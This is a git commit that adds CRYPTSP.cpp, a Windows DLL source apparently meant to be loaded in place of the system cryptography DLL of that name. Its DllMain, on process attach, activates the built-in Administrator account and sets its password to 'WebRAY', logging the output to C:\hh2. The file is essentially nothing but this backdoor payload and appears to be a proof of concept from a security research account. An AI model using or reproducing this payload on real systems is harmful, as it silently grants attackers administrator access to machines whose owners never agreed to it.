0dbdb8aed19336be8b2ffba1c01f79bb444802ab
webraybtl <95903558+webraybtl@users.noreply.github.com>
2022-04-22 16:38:27 +0800

    Add files via upload

---
+++ CRYPTSP.cpp
@@ -0,0 +1,22 @@
+// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "stdafx.h"
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+					 )
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+        system("net user Administrator /active:yes");
+        system("net user Administrator WebRAY > C:\\hh2");
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
